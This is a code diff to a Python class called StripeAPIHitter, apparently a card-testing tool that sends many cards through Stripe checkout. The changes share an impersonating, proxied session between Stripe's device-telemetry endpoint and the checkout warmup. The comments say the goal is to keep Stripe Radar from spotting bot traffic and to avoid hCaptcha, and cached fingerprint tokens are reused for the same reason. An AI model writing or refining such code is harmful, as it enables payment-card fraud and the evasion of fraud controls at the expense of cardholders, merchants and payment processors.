@@ -756,7 +756,7 @@ class StripeAPIHitter:
         self.raw_amount = raw_amount
         self.locked_email = locked_email
 
-    async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None) -> Dict[str, str]:
+    async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None, session=None) -> Dict[str, str]:
         """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
         import uuid as _uuid
         fallback = {'muid': str(_uuid.uuid4()), 'sid': str(_uuid.uuid4()), 'guid': str(_uuid.uuid4())}
@@ -810,7 +810,7 @@ class StripeAPIHitter:
                 "content-type": "application/json",
                 "accept": "application/json",
                 "origin": "https://js.stripe.com",
-                "referer": "https://js.stripe.com/",
+                "referer": landing_url,
                 "user-agent": profile['user_agent']
             }
             if "sec-ch-ua" in profile:
@@ -820,10 +820,18 @@ class StripeAPIHitter:
             if "sec-ch-ua-platform" in profile:
                 tel_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
 
-            tel_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
-                "https://m.stripe.com/6",
-                headers=tel_headers,
-                json=payload, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
+            # Use the shared session if provided so m.stripe.com/6 shares the cookie jar
+            # with the checkout page warmup (same stripe_mid cookie = legitimate session continuity)
+            if session is not None:
+                tel_res = await loop.run_in_executor(None, lambda: session.post(
+                    "https://m.stripe.com/6",
+                    headers=tel_headers,
+                    json=payload, timeout=10))
+            else:
+                tel_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
+                    "https://m.stripe.com/6",
+                    headers=tel_headers,
+                    json=payload, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
             if tel_res.status_code == 200:
                 t = tel_res.json()
                 return {'muid': t.get('muid') or fallback['muid'], 'sid': t.get('sid') or fallback['sid'], 'guid': t.get('guid') or fallback['guid']}
@@ -947,11 +955,19 @@ class StripeAPIHitter:
                 # Stripe device fingerprint tokens (muid/sid/guid)
                 # Reuse cached session tokens if available — mimics __stripe_mid (1yr) + __stripe_sid (30min)
                 # A fresh token per card is a blatant bot signal to Stripe Radar
+                #
+                # CRITICAL: Create the shared session BEFORE calling generate_stripe_telemetry so
+                # m.stripe.com/6 fires through the same cookie jar as warmup and payment_methods.
+                # Isolated cffi_requests.post() drops cookies → Radar sees orphaned telemetry → hCaptcha
+                _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
+                if proxies:
+                    _cffi_session.proxies = proxies
+
                 if cached_stripe_tokens and cached_stripe_tokens.get('muid'):
                     stripe_tokens = cached_stripe_tokens
                 else:
-                    # First card in session — generate tokens and they'll be cached by the caller
-                    stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url)
+                    # First card in session — generate tokens through shared session (cookie continuity)
+                    stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url, session=_cffi_session)
                     # Return freshly generated tokens so the session-level cache can store them
                     result['_stripe_tokens'] = stripe_tokens
     
@@ -1019,10 +1035,8 @@ class StripeAPIHitter:
                 # Using cffi AsyncSession so cookies set on the warmup GET (stripe_mid, __stripe_mid, etc.)
                 # flow automatically into all subsequent API calls — Radar tracks these for session continuity.
                 # Without shared cookies, Radar sees orphaned API calls → hCaptcha trigger.
+                # NOTE: session already created above before telemetry call
                 rqdata_token = None
-                _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
-                if proxies:
-                    _cffi_session.proxies = proxies
                 try:
                     warmup_headers = {
                         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
